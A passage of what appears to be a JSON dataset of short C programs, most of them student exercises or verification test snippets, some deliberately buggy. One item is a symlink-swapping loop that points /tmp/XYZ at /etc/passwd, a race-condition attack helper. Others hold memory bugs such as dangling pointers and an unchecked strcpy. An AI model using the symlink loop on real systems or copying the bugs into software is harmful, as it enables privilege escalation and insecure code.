printf(\"*\");\n                        }\n                        else\n                            printf(\"%d\",c[i][j]);\n                }\n                else if(b[i][j]=='.'){\n                        if(flag==1&&a[i][j]=='*')\n                            printf(\"*\");\n                        else\n                            printf(\".\");\n                }\n        }\n        printf(\"\\n\");\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nvoid troca(int *x,int *y);\nint main(){\n    int i,j;\n    printf(\"Digite dois valores: \");\n    scanf(\"%d %d\",&i,&j);\n    printf(\"Antes da troca: %d e %d\\n\\n\",i,j);\n    troca(&i,&j);\n    printf(\"Depois da troca: %d e %d\",i,j);\n    return 0;\n}\nvoid troca(int *x, int *y){\n    int aux;\n    aux=*x;\n    *x=*y;\n    *y=aux;\n}",
    "#include <stdio.h>\nvoid int2bin(unsigned int integer, char* binary, unsigned int n) {\n    int d = n/8;\n    if (n%8 != 0) {\n        n = 8*(d+1);\n    }\n    for (int i = 0; i < n; i ++) {\n        binary[i] = integer & (1 << (n-i-1)) ? '1' : '0';\n    }\n    binary[n] = '\\0';\n}\nint main() {\n    printf(\"Visible Char\\'s ASCII Code Map\\n\");\n    printf(\"_______________________________________\\n\");\n    printf(\"|      |     |          |      |      |\\n\");\n    printf(\"| Char | Dec | Bin      | Oct  | Hex  |\\n\");\n    printf(\"|______|_____|__________|______|______|\\n\");\n    char tmp[33];\n    for (int i = 32; i <= 126; i ++) {\n        int2bin(i, tmp, 8);\n        printf(\"|      |     |          |      |      |\\n\");\n        printf(\"| %c    | %-3d | %s | 0%-3o | 0x%x |\\n\", i, i, tmp, i, i);\n        printf(\"|______|_____|__________|______|______|\\n\");\n    }\n}",
    "#include <stdio.h>\nint main() {\n  int a = 10;\n  int b = 11;\n  {\n    int c = 12;\n    int d = 13;\n    int e = a + c;\n    c = b + d;\n    printf(\"c: %d\\n\", c);\n    printf(\"e: %d\\n\", e);\n  }\n  int f = 14;\n  int g = 15;\n  printf(\"f: %d\\n\", f);\n  printf(\"g: %d\", g);\n}",
    "#include <fcntl.h>\n#include <stdio.h>\nint main() {\n    int fd = creat(\"a.txt\", 00700);\n    if (fd == -1) {\n        perror(\"creat\");\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <time.h>\nint main(void) {\n int numerosecreto,chute,tentativas=0, dificuldade, ligar=1;\n do{\n  system(\"cls\");\n  srand(time(((void*)0)));\n  numerosecreto = rand()%51;\n  printf(\"BEM VINDO AO JOGO DE ADIVINHACAO\\n\");\n  printf(\"Selecione o nivel\\n\");\n  printf(\"1- facil\\n\");\n  printf(\"2- medio\\n\");\n  printf(\"3- dificil\\n\");\n  do {\n  scanf(\"%d\", &dificuldade);\n  system(\"cls\");\n   switch (dificuldade){\n    case 1:\n     tentativas=20;\n     break;\n    case 2:\n     tentativas=16;\n     break;\n    case 3:\n     tentativas=6;\n     break;\n    default:\n     printf(\"Opcao invalida\\nDigite novamente\\n\");\n     tentativas=0;\n   }\n  } while (tentativas==0);\n  int i=0;\n  for ( i=tentativas; i>0; i--){\n   printf(\"Voce tem %d tentativas\\n\", i);\n   printf(\"Digite seu palpite entre 0 e 50\\n\");\n   scanf(\"%d\", &chute);\n   if (chute==numerosecreto){\n    printf(\"PARABENS VC ACERTOU O NUMERO SECRETO %d\\n\", numerosecreto);\n    printf(\"Voce deseja jogar novamente?\\n1-SIM\\n2-NAO\\n\");\n    scanf(\"%d\", &ligar);\n    system(\"cls\");\n    break;\n   }else if (i>1) {\n    if(chute>numerosecreto){\n     system(\"cls\");\n     printf(\"\\nERROUUUU\\nTente novamente\\n\");\n     printf(\"O seu chute %d foi maior que o numero secreto\\n\\n\", chute);\n    }\n    else if(chute<numerosecreto){\n     system(\"cls\");\n     printf(\"\\nERROUUUU\\nTente novamente\\n\");\n     printf(\"O seu chute %d foi menor que o numero secreto\\n\\n\", chute);\n    }\n   }\n  }\n  if (i==0){\n   printf(\"GAME OVER\\nO numero secreto e %d\\n\\n\", numerosecreto);\n   printf(\"Voce deseja jogar novamente?\\n1-SIM\\n2-NAO\\n\");\n   scanf(\"%d\", &ligar);\n  }\n }while(ligar==1);\n     printf(\"Obrigado por jogar, ATE BREVE \");\n  system(\"pause\");\n return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\n#include <stdio.h>\n#include <math.h>\nlong long prime[1000000];\nint main(void) {\n    int i, j, N;\n    memset(prime, 1, sizeof(prime));\n    prime[0] = prime[1] = 0;\n    for(i = 2; i <= (int) sqrt(999999); i++) {\n        if(prime[i]) {\n            for(j = i * i; j <= 999999; j += i) {\n                prime[j] = 0;\n            }\n        }\n    }\n    while(~scanf(\"%d\", &N)) {\n        int count = 0;\n        for(i = 0; i <= N; i++) {\n            if(prime[i]) {\n                count++;\n            }\n        }\n        printf(\"%d\\n\", count);\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n\nvoid SelectionSort(int vetor[],int tamanho);\nint main()\n{\n    int i, vetor[10];\n    printf(\"Digite os valores do seu vetor\\n\");\n    for(i=0; i<10; i++)\n    {\n        printf(\"Digite um valor: \");\n        scanf(\"%d\", &vetor[i]);\n    }\n    SelectionSort(vetor, 10);\n    for(i=0; i<10; i++)\n    {\n        printf(\"%d | \", vetor[i]);\n    }\n    return 0;\n}\nvoid SelectionSort(int vetor[],int tamanho)\n{\n    int i, j, menor, auxiliar;\n    for(i=0;i<10 -1;i++){\n        menor=i;\n        for(int j=i+1 ; j<10 ; j++){\n            if(vetor[menor] > vetor[j])\n                menor=j;\n        }\n        if(i!=menor){\n            auxiliar=vetor[i];\n            vetor[i]=vetor[menor];\n            vetor[menor]=auxiliar;\n        }\n    }\n}",
    "#include <unistd.h>\nint main()\n{\n    while (1)\n    {\n        unlink(\"/tmp/XYZ\");\n        symlink(\"/tmp/ABC\", \"/tmp/XYZ\");\n        usleep(10000);\n        unlink(\"/tmp/XYZ\");\n        symlink(\"/etc/passwd\", \"/tmp/XYZ\");\n        usleep(10000);\n    }\n}",
    "#include <unistd.h>\n#include <string.h>\n#include <sys/types.h>\n#include <fcntl.h>\n#include <errno.h>\n\nint cat_read_size = 1;\nchar colon[2] = { ':', ' ' };\nchar nl = '\\n';\nvoid dumpfile(fd)\nint fd;\n{\n int nred;\n static char readbuf[4096];\n while ((nred=read(fd,readbuf,cat_read_size)) > 0) {\n  write(1,readbuf,nred);\n }\n}\nint main(argc,argv)\nint argc;\nchar **argv;\n{\n int i, fd;\n if(argc <= 1) {\n  dumpfile(0);\n } else {\n  for(i=1;i<argc;i++) {\n   fd = open(argv[i], (0x04000000));\n   if(fd == -1) {\n    write(2, argv[0], strlen(argv[0]));\n    write(2, colon, 2);\n    write(2, argv[i], strlen(argv[i]));\n    write(2, colon, 2);\n    write(2, strerror (errno), strlen (strerror (errno)));\n    write(2, &nl, 1);\n   } else {\n    dumpfile(fd);\n    close(fd);\n   }\n  }\n }\n}",
    "#include <stdio.h>\n#include <math.h>\ndouble Disc(double a, double b, double c)\n{\n    return b*b - 4*a*c;\n}\nint main() {\n    double a, b, c, d;\n    int n;\n    n = scanf(\"%lf %lf %lf\", &a, &b, &c);\n    if (n != 3) {\n        printf(\"Error: wrong input \\n\");\n        return 1;\n    }\n    if (a == 0) {\n        printf(\"Error: not a quadric equation \\n\");\n        return 2;\n    }\n    d = Disc(a, b, c);\n    if (d < 0){\n        printf(\"No real roots \\n\");\n        return 0;\n    }\n    d = sqrt(d);\n    printf(\"%.5f %.5f \\n\", (-b-d)/(2*a), (-b+d)/(2*a));\n    return 0;\n}",
    "#include <stdlib.h>\n#include <stdio.h>\nint main (void)\n{\n int *p, *q, i, a;\n scanf(\"%d\", &a);\n p = (int*)malloc(sizeof(int)*50);\n if (p == 0) { return 1; }\n q = p;\n for (i = 0; i<50; i++) {\n  (*q) = i;\n  q++;\n }\n if (a > 10) {\n  q = p;\n }\n (*q) = 1024;\n printf (\"%d\", p[25] + *q);\n free(p);\n return 0;\n}",
    "#include <math.h>\n#include <stdbool.h>\n#include <stdio.h>\nstatic inline _Bool isPrime(const unsigned n)\n{\n  if(n <= 1) return 0;\n  else if(n < 4) return 1;\n  else if(!(n & 1)) return 0;\n  else if(n < 9) return 1;\n  else if(!(n % 3)) return 0;\n  const unsigned limit = sqrt(n);\n  for(unsigned i = 5; i <= limit; i += 6)\n  {\n    if(!(n % i) || !(n % (i + 2))) return 0;\n  }\n  return 1;\n}\nint main(void)\n{\n  unsigned primeSum = 5;\n  for(unsigned i = 5, primeCount = 2; primeCount < 1000; i += 6)\n  {\n    if(isPrime(i))\n    {\n      ++primeCount;\n      primeSum += i;\n    }\n    if(isPrime(i + 2))\n    {\n      ++primeCount;\n      primeSum += i + 2;\n    }\n  }\n  printf(\"%u\\n\", primeSum);\n}",
    "#include<stdio.h>\nint* fun()\n{\n    int data;\n    int *ptr = &data;\n    *ptr = 5;\n    return ptr;\n}\nint main()\n{\n    int *ptr = fun();\n    printf(\"%d\\n\",*ptr);\n    return 0;\n}",
    "#include <stdio.h>\nint main(void) {\n    int input;\n    int answer;\n    scanf(\"%d\", &input);\n    printf(\"%d\", answer);\n    return 0;\n}",
    "int main()\n{\n int a;\n a = 1;\n while(a< 100){\n  a = 10;\n  a = a + 1;\n }\n}",
    "#include <stdlib.h>\n#include <stdio.h>\nvoid run(void) {\n int n = 0;\n while (1) {\n  if (rand() % 2) {\n   if (n <= 9) n++;\n  }\n  else {\n   if (n == 10) {\n    printf(\"reachable instruction!\\n\");\n    n = 0;\n   }\n  }\n }\n}\nint main(void) {\n run();\n return 0;\n}",
    "#include<stdio.h>\nint main(){\n int a,b,c;\n printf(\"Digite as medidas das laterais do triangulo\\n\");\n scanf(\"%d %d %d\",&a,&b,&c);\n if (a<b+c && b<a+c && c<a+b)\n  {\n   if (a==b && b==c)\n   {\n    printf(\"Este e um triangulo Equilatero\");\n     }\n   else if (a!=b && b!=c)\n   {\n    printf(\"Este e um triangulo Escaleno\");\n     }\n   else\n    printf(\"Este e um Isosceles\");\n  }\n else\n printf(\"Estas medidas nao correspondem a um triangulo\");\n return 1;\n}",
    "#include <stdio.h>\n#include <math.h>\n#include <string.h>\nchar matrix[1024][1025];\nvoid gerarMatrix(short lvl, short rot)\n{\n    short i, aux1, aux2, j;\n    if (lvl == 0) {\n        matrix[0][0] = '0';\n    }else{\n        gerarMatrix(lvl - 1, rot);\n        aux1 = pow(2, lvl);\n        aux2 = pow(2, (lvl - 1));\n        if (rot == 0) {\n            for (i = 0;i < aux1;i++){\n                if (i < aux2) {\n                    memcpy(&matrix[i][aux2], &matrix[i][0], sizeof (char) * aux2);\n                    matrix[i][aux1] = '\\0';\n                }else{\n                    memcpy(&matrix[i][0], &matrix[i - aux2][0], sizeof (char) * aux1);\n                    for (j = aux2;j < aux1;j++){\n                        matrix[i][j] = matrix[i][j] ^ 1;\n                    }\n                    matrix[i][aux1] = '\\0';\n                }\n            }\n        }else\n            if (rot == 1) {\n                for (i = 0;i < aux1;i++){\n                    if (i < aux2) {\n                        memcpy(&matrix[i][aux2], &matrix[i][0], sizeof (char) * aux2);\n                        for (j = aux2;j < aux1;j++){\n                            matrix[i][j] = matrix[i][j] ^ 1;\n                        }\n                        matrix[i][aux1] = '\\0';\n                    }else{\n                        memcpy(&matrix[i][0], &matrix[i - aux2][0], sizeof (char) * aux2);\n                        memcpy(&matrix[i][aux2], &matrix[i - aux2][0], sizeof (char) * aux2);\n                        matrix[i][aux1] = '\\0';\n                    }\n                }\n            }else\n                if (rot == 2) {\n                    for (i = 0;i < aux1;i++){\n                        if (i < aux2) {\n                            memcpy(&matrix[i][aux2], &matrix[i][0], sizeof (char) * aux2);\n                            for (j = 0;j < aux2;j++){\n                                matrix[i][j] = matrix[i][j] ^ 1;\n                            }\n                            matrix[i][aux1] = '\\0';\n                        }else{\n                            memcpy(&matrix[i][0], &matrix[i - aux2][aux2], sizeof (char) * aux2);\n                            memcpy(&matrix[i][aux2], &matrix[i][0], sizeof (char) * aux2);\n                            matrix[i][aux1] = '\\0';\n                        }\n                    }\n                }else{\n                    for (i = 0;i < aux1;i++){\n                        if (i < aux2)\n                            memcpy(&matrix[i][aux2], &matrix[i][0], sizeof (char) * aux2);\n                        else{\n                            memcpy(&matrix[i][0], &matrix[i - aux2][0], sizeof (char) * aux1);\n                            for (j = 0;j < aux2;j++){\n                                matrix[i][j] = matrix[i][j] ^ 1;\n                            }\n                            matrix[i][aux1] = '\\0';\n                        }\n                    }\n                }\n    }\n}\nint main()\n{\n    short rot, lvl, size, i;\n    while (scanf(\"%hd %hd\", &lvl, &rot) != (-1)){\n        rot = rot % 4;\n        size = pow(2, lvl);\n        gerarMatrix(lvl, rot);\n        for (i = 0;i < size;i++){\n            matrix[i][size] = '\\0';\n            printf(\"%s\\n\", matrix[i]);\n        }\n    }\n    return 0;\n}",
    "#include<stdio.h>\nint main (){\n int nota1,nota2,nota3,freq;\n float media;\n printf(\"Informe a nota 1 \\n\");\n scanf(\"%d\",&nota1);\n printf(\"Informe a nota 2 \\n\");\n scanf(\"%d\",&nota2);\n printf(\"Informe a nota 3 \\n\");\n scanf(\"%d\",&nota3);\n printf(\"Informe a frequencia \\n\");\n scanf(\"%d\",&freq);\n media = (nota1+nota2+nota3)/3;\n freq=(100*freq)/200;\n if ((media >=7)&&(freq>=25)){\n  printf(\"Aprovado\\n\");\n }\n if ((media<7)||(freq<25)){\n  if (media<7){\n   printf(\"reprovado por nota\\n\");\n  }\n  if (freq<50){\n   printf(\"reprovado por falta\\n\");\n  }\n }\n return 0;\n}",
    "void reach_error(){}\nint main() {\n  int i = 0;\n  while (i<10) {\n    i++;\n  }\n  if (i<10) {\n    reach_error();\n  }\n  return 0;\n}",
    "#include<stdio.h>\nvoid change_number(int x);\nint main()\n{\n    int x;\n    printf(\"Enter the number x: \");\n    scanf(\"%d\", &x);\n    printf(\"In the main program: x = %dn\", x);\n    change_number(x);\n    printf(\"In the main program: x = %dn\", x);\n}\nvoid change_number(int x) {\n    x += 3;\n    printf(\"In the subroutine: x = %dn\", x);\n}",
    "#include <stdio.h>\n#include <limits.h>\nint main(){\n    int a[5], b[5];\n    int i, j;\n    for(i = 0; i < 5; i++)\n        scanf(\"%d\", &a[i]);\n    for(i = 0; i < 5; i++)\n        scanf(\"%d\", &b[i]);\n    int runningMin = 2147483647;\n    int isPresent;\n    for(i = 0; i < 5; i++){\n        isPresent = 0;\n        for(j = 0; j < 5; j++)\n            if(a[i] == b[j])\n                isPresent = 1;\n        if(!isPresent)\n            if(a[i] < runningMin)\n                runningMin = a[i];\n    }\n    printf(\"%d\", runningMin);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\n\n\nvoid input(int *seq, int *record, int n);\nvoid com(int n, int m, int i, int *record, int *seq, int *output);\nvoid print(int *output, int m);\nint cmp(const void *a, const void *b);\nint main(void)\n{\n    int test_case;\n    int seq[10], record[10], output[10];\n    int m, n, i;\n    scanf(\"%d\", &test_case);\n    for (i = 0; i < test_case; i++) {\n        scanf(\"%d %d\", &n, &m);\n        input(seq, record, n);\n        qsort(seq, n, sizeof(int), cmp);\n        printf(\"Case %d:\\n\", i + 1);\n        com(n, m, 0, record, seq, output);\n    }\n    return 0;\n}\nvoid input(int *seq, int *record, int n)\n{\n    int i;\n    for (i = 0; i < n; i++) {\n        scanf(\"%d\", seq + i);\n        record[i] = 0;\n    }\n}\nint cmp(const void *a, const void *b)\n{\n    return (*(int *)a) - (*(int *)b);\n}\nvoid com(int n, int m, int i, int *record, int *seq, int *output)\n{\n    if (i == m) {\n        print(output, m);\n        return;\n    }\n    int j;\n    for (j = 0; j < n; j++) {\n        if (record[j] == 0 && i < m) {\n            record[j] = 1;\n            output[i] = seq[j];\n            com(n, m, i + 1, record, seq, output);\n            record[j] = 0;\n        }\n    }\n}\nvoid print(int *output, int m)\n{\n    int i;\n    for (i = 0; i < m; i++) {\n        printf(\"%d\", output[i]);\n    }\n    putchar('\\n');\n}",
    "#include <stdio.h>\nvoid writeFile(const char* s)\n{\n  FILE *fp;\n  fp = fopen(\"test.txt\", \"w+\");\n  fprintf(fp, \"%s\\n\",s);\n  fclose(fp);\n}\nint main() {\n   writeFile(\"Blargh\");\n}",
    "#include <stdio.h>\n\n\nint sum2d(int rows, int cols, int ar[rows][cols]);\nint main(void)\n{\n    int i,j;\n    int rs = 3;\n    int cs = 10;\n    int junk[3][4] = {\n            {2,4,6,8},\n            {3,5,7,9},\n            {12,10,8,6}\n    };\n    int morjunk[3 -1][4 +2] = {\n        {20,30,40,50,60,70},\n        {5,6,7,8,9,10}\n    };\n    int varr[rs][cs];\n    for (i = 0; i < rs; ++i) {\n        for (j = 0; j < cs; ++j) {\n           varr[i][j] = i*j+j;\n        }\n    }\n    printf(\"3x5 array\\n\");\n    printf(\"Sum of all elements = %d\\n\",sum2d(3,4,junk));\n    printf(\"2x6 array\\n\");\n    printf(\"Sum of all elements = %d\\n\",sum2d(3 -1,4 +2,morjunk));\n    printf(\"3x10 VLA\\n\");\n    printf(\"Sum of all elements = %d\\n\",sum2d(rs,cs,varr));\n    return 0;\n}\nint sum2d(int rows,int cols, int ar[rows][cols])\n{\n    int r,c,tot=0;\n    for(r = 0;r<rows;r++)\n        for (c = 0; c <cols ; ++c) {\n            tot += ar[r][c];\n        }\n    return tot;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main()\n{\n    int n,p=0,i=1,maior=0;\n    do{\n        scanf(\"%d\", &n);\n        if (n>maior)\n        {\n            maior=n;\n            p=i;\n        }\n    i++;\n    } while (i<=100);\n    printf(\"%d\\n%d\\n\",maior,p);\n    return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    int n = 15;\n    int *p = &n;\n    char c = 'H';\n    char *cp = &c;\n    printf(\"Egy mutat\u00f3 m\u00e9rete byte-ban: %d\\n\", sizeof(p));\n    printf(\"Egy mutat\u00f3 m\u00e9rete byte-ban: %d\\n\", sizeof(cp));\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nvoid printArray(char **arr, int arrNum)\n{\n    for (int i = 0; i < arrNum; i++)\n    {\n        printf(\"\u65b9\u5f0f1\u8f93\u51fa%s\\n\", arr[i]);\n        printf(\"\u65b9\u5f0f2\u8f93\u51fa%s\\n\", *(arr + i));\n    }\n}\nvoid sortArray(char **arr, int arrNum)\n{\n    int i = 0, j = 0;\n    char *tmp = ((void*)0);\n    printf(\"\u6392\u5e8f\u524d\u8f93\u51fa\uff1a\\n\");\n    for (i = 0; i < arrNum; i++)\n    {\n        printf(\"%s\\n\", *(arr + i));\n    }\n    for (i = 0; i < arrNum; i++)\n    {\n        for (j = i + 1; j < arrNum; j++)\n        {\n            if (strcmp(arr[i], arr[j]) > 0)\n            {\n                tmp = arr[i];\n                arr[i] = arr[j];\n                arr[j] = tmp;\n            }\n        }\n    }\n    printf(\"\u6392\u5e8f\u540e\u8f93\u51fa\uff1a\\n\");\n    for (i = 0; i < arrNum; i++)\n    {\n        printf(\"%s\\n\", *(arr + i));\n    }\n}\nint main()\n{\n    int arrNum = 0;\n    char *arr[] = {\"aasasa\", \"ababdd\", \"wdafwd\", \"ihiytnf\", \"wdafcr\", \"htotte\"};\n    arrNum = sizeof(arr) / sizeof(arr[0]);\n    printf(\"sizeof(arr): %d\\n\", sizeof(arr));\n    printf(\"sizeof(arr[0]): %d\\n\", sizeof(arr[3]));\n    printArray(arr, arrNum);\n    sortArray(arr, arrNum);\n    return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    int ch;\n    for (ch='A'; ch<='Z'; ch++) {\n        putchar(ch);\n        printf(\",\");\n    }\n    printf(\"\\n\");\n}",
    "#include <stdio.h>\n#include <string.h>\n#include <unistd.h>\n#include <fcntl.h>\nint main(int argc, char **argv)\n{\n char hid_buffer[64 + 1];\n if (argc < 3) {\n  fprintf((stderr), \"Usage %s <device file> <message>\\n\", argv[0]);\n  return -1;\n }\n int fd = open(argv[1], ((0x04000000) | (0x10000000)));\n if (fd == -1) {\n  fprintf((stderr), \"Couldn't open device file\\n\");\n  return -1;\n }\n hid_buffer[0] = 0;\n if (strlen(argv[2]) > 63)\n  argv[63] = 0;\n strcpy(hid_buffer + 1, argv[2]);\n write(fd, hid_buffer, sizeof(hid_buffer));\n close(fd);\n}",
    "#include <stdio.h>\nint main(){\n\n\n\n\n\n\n  printf(\"%s\\n\", \"inner\");\n\n  printf(\"%s\\n\", \"outer\");\n}",
    "#include <stdio.h>\n#include <string.h>\nint main() {\n printf(\"Hello vim\\n\");\n int a = 0;\n printf(\"Enter a number: \");\n  scanf(\"%i\", &a);\n if (a < 0) {\n    printf(\"a less than zero\\n\");\n } else if (a > 0) {\n    printf(\"a greater than zero\\n\");\n } else {\n    printf(\"you win!\\n\");\n }\n return 0;\n}",
    "#include<stdio.h>\nint main()\n{\n int i;\n printf(\"even numbers between 1 to 50:\\n\");\n for(i=1 ;i<=50 ;i++)\n if(i%2==0)\n printf(\"%d\",i);\n}",
    "#include <stdio.h>\nint main(void)\n{\n int c, i = 0;\n printf(\"#ifdef HAVE_CONFIG_H\\n\");\n printf(\"# include \\\"config.h\\\"\\n\");\n printf(\"#endif\\n\\n\");\n printf(\"#ifdef EMBED\\n\");\n printf(\"unsigned char flash_data[] = {\\n\");\n while((c = getchar()) != (-1)) {\n  printf(\"0x%.2x, \", c);\n  if(!(i % 32))\n   printf(\"\\n\");\n  i++;\n }\n printf(\" };\\n\");\n printf(\"#endif\\n\");\n return(0);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\n\n\n\nchar Buffer[1000], Exm[100] ;\nFILE *InExm, *InAns ;\nint Right=0, Wrong=0, Omitt=0 ;\nint main ( int argc, char *argv[] ) {\n  char Ans ;\n  int i ;\n  if (argc < 2) {\n    printf ( \"eval SerialNumber\\n\" ) ;\n    exit (1) ;\n  }\n  if (( InExm = fopen (strcat(strcpy(Buffer,argv[1]),\".exm\"), \"r\")) == ((void*)0) ) {\n    printf (\"ERROR: Can't open %s.\\n\", Buffer ) ;\n    exit (1) ;\n  }\n  if (( InAns = fopen (strcat(strcpy(Buffer,argv[1]),\".ans\"), \"r\")) == ((void*)0) ) {\n    printf (\"ERROR: Can't open %s.\\n\", Buffer ) ;\n    exit (1) ;\n  }\n  printf ( \"\\nSERIAL No: %s\\n         \", argv[1] ) ;\n  i = 0 ;\n  while ( !feof(InExm)) {\n    Exm[i] = getc(InExm) ;\n    printf ( \"%c \", Exm[i] ) ;\n    i++ ;\n  }\n  fclose (InExm) ;\n  printf ( \"\\nCORRECT: \" ) ;\n  i = 0 ;\n  while (1) {\n    Ans = getc(InAns) ;\n    if ( Ans=='~')\n      break ;\n    if ( feof(InAns)) {\n      printf ( \"\\nERROR: Unexpected end of file.\\n\" ) ;\n      exit (1) ;\n    }\n    printf ( \"%c \", Ans ) ;\n    if ( Exm[i] == 'X' || Exm[i] < 64 || Exm[i] > 91 )\n      Omitt++ ;\n    else if ( Exm[i] == Ans )\n      Right++ ;\n    else\n      Wrong++ ;\n    i++ ;\n  }\n  fclose (InAns) ;\n  printf ( \"\\nCORRECT: %d\\tWRONG: %d\\tOMITTED: %d\\n\", Right, Wrong, Omitt ) ;\n  printf ( \"\\n\\n\\n---------------------------------------------------------\\n\" ) ;\n  exit (0) ;\n}",
    "#include <stdio.h>\nint main()\n{\n    int n = 20, vetor[n], aux[n], cnt = 0, i, total = 1, total2 = 1;\n    for (size_t i = 0; i < n; i++)\n    {\n        printf(\"Digite um numero: \");\n        scanf(\"%d\", &vetor[i]);\n    }\n    for (size_t i = 0; i < n; i++)\n    {\n        if (vetor[i] % 2 != 0)\n        {\n            cnt++;\n            aux[i] = i;\n            total *= vetor[i];\n            total2 *= aux[i];\n        }\n        else\n        {\n            aux[i] = -1;\n        }\n    }\n    printf(\"Numero de impares: %d\\n\", cnt);\n    for (size_t i = 0; i < n; i++)\n    {\n        if (aux[i] != -1)\n        {\n            printf(\"Posicao: %d\\n\", aux[i]);\n        }\n    }\n    if(cnt == 0) {\n        total = 0;\n        total2 = 0;\n    }\n    printf(\"Produtorio dos impares: %d\", total);\n    printf(\"Produtorio de posicao: %d\", total2);\n    return 0;\n}",
    "#include <stdio.h>\n#include <unistd.h>\n\nint getchar(void)\n{\n    static char buf[1000];\n    static char *bufp=buf;\n    static int n=0;\n    if(n==0)\n{\n        n=read(0,buf,sizeof(buf));\n        bufp=buf;\n}\n    return (--n>0) ? (unsigned char ) (*bufp++) : (-1);\n}\nint main()\n{\n    int c;\n    c=getchar();\n    putchar(c);\n}",
    "#include <stdio.h>\n#include <inttypes.h>\nstatic void print_shift(int32_t x) {\n  printf(\"shift_31(%\"\"d\"\") = %\"\"d\"\"\\n\", x, (x >> 31));\n  printf(\"shift_11(%\"\"d\"\") = %\"\"d\"\"\\n\", x, (x >> 11));\n}\nstatic void print_shift_and(int32_t x, int32_t q) {\n  printf(\"shift_31(%\"\"d\"\" & %\"\"d\"\") = %\"\"d\"\"\\n\", x, q, (x >> 31) & q);\n  printf(\"shift_11(%\"\"d\"\" & %\"\"d\"\") = %\"\"d\"\"\\n\", x, q, (x >> 11) & q);\n}\nint main(void) {\n  int32_t i;\n  for (i=0; i<1003; i++) {\n    print_shift(i);\n    print_shift(-i);\n    print_shift_and(i, 12289);\n    print_shift_and(-i, 12289);\n  }\n  return 0;\n}",
    "#include <stdlib.h>\n#include <stdio.h>\n#include <stdbool.h>\n#include <ctype.h>\n#include <limits.h>\nint to_int(char *s)\n{\n _Bool start = 0, neg = 0;\n long int ret = 0;\n for (int i = 0; (s[i] != '\\0') && !(start && !(0 ? isdigit(s[i]) : ((unsigned)(s[i])-'0') < 10)); i++)\n {\n  if (start)\n  {\n   ret = 10 * ret + s[i] - 48;\n  }\n  else if ((0 ? isdigit(s[i]) : ((unsigned)(s[i])-'0') < 10))\n  {\n   start = 1;\n   ret = 10 * ret + s[i] - 48;\n  }\n  else if (s[i] == '-')\n  {\n   start = 1;\n   neg = 1;\n  }\n  else if (s[i] == '+')\n  {\n   start = 1;\n  }\n  else if (s[i] != ' ')\n  {\n   return 0;\n  }\n  if (!neg && (2147483647 < ret))\n  {\n   return 2147483647;\n  }\n  else if (neg && (-1 * ret < (-2147483647 -1)))\n  {\n   return (-2147483647 -1);\n  }\n }\n return ret * ((neg) ? -1 : 1);\n}\nint main(int argc, char *argv[])\n{\n printf(\"%d\\n\", to_int(\"     -1234 asdf\"));\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nvoid convert(char*, char*);\nvoid push (char*, char);\nchar pop(char*);\nint top = -1;\nint main()\n{\n    char infix[10],postfix[10];\n    printf(\"Enter infix :\");\n    scanf(\"%s\", infix);\n    printf(\"Infix  : %s\\n\", infix);\n    convert(infix, postfix);\n    printf(\"Postfix  : %s\\n\", postfix);\n}\nint inputprecedence(char c)\n{\n    switch(c)\n    {\n        case '+':return 1;\n        case '-':return 1;\n        case '*':return 3;\n        case '/':return 3;\n        case '$':return 6;\n        case '(':return 9;\n        case ')':return 0;\n        default:return 7;\n    }\n}\nint stackprecedence(char c)\n{\n    switch(c)\n    {\n        case '+':return 2;\n        case '-':return 2;\n        case '*':return 4;\n        case '/':return 4;\n        case '$':return 5;\n        case '(':return 0;\n        case '#':return -1;\n        default:return 8;\n    }\n}\nvoid push(char *stack, char c)\n{\n    top+=1;\n    stack[top] = c;\n}\nchar pop(char* stack)\n{\n    char x = stack[top];\n    top-=1;\n    return x;\n}\nvoid convert(char *infix, char *postfix)\n{\n    char stack[10];\n    int ctr = 0;\n    top = -1;\n    push(stack, '#');\n    int i = 0;\n    while (infix[i])\n    {\n        while(stackprecedence(stack[top])>inputprecedence(infix[i]))\n        {\n            postfix[ctr]=pop(stack);\n            ctr+=1;\n        }\n        if(stackprecedence(stack[top])<inputprecedence(infix[i]))\n        {\n            push(stack, infix[i]);\n        }\n        else\n        {\n            pop(stack);\n        }\n        i+=1;\n    }\n    while(top!=-1)\n    {\n        postfix[ctr]=pop(stack);\n        ctr+=1;\n    }\n    postfix[ctr-1] = '\\0';\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main(int argc, char **argv)\n{\n    if (argc == 1) {\n        printf(\"wzip: file1 [file2 ...]\\n\");\n        exit(1);\n    }\n    FILE *fp;\n    int i;\n    char c;\n    int count = 1;\n    char prev;\n    for (i = 1; i < argc; i++) {\n        fp = fopen(argv[i], \"r\");\n        if (fp == ((void*)0)) {\n            printf(\"wzip: cannot open file\\n\");\n         exit(1);\n        }\n        while(fread(&c, sizeof(char), 1, fp)) {\n            if (c == prev) count++;\n            else if (c!= prev && count > 1) {\n                fwrite(&count, sizeof(int), 1, (stdout));\n                fwrite(&prev, sizeof(char), 1, (stdout));\n                count = 1;\n            } else fwrite(&prev, sizeof(char), 1, (stdout));\n            prev = c;\n        }\n        fclose(fp);\n    }\n    return 0;\n}",
    "#include <stdlib.h>\n#include <stdio.h>\nint test_foo(int x) {\n  return x;\n}\nint main(void) {\n  return test_foo(3);\n}",
    "#include <stdio.h>\nint* f1(int *a, int *b) {\n int *c;\n a = b;\n c = a;\n return c;\n}\nint* f2(int **apx, int **bpx);\nint main() {\n int a, b, c;\n int *pa, *pb, *pc, *pd;\n a = 1; b = 2; c = 3;\n pa = &a; pb = &b;\n pc = f1(pa, pb);\n printf(\"%d %d\\n\", *pc, *pa);\n pd = f2(&pa, &pb);\n printf(\"%d %d\\n\", *pd, *pa);\n return 0;\n}\nint* f2(int **ap, int **bp) {\n int *cp, **ip, *dp;\n ap = bp;\n cp = *ap;\n ip = &cp;\n dp = *ip;\n return dp;\n}",
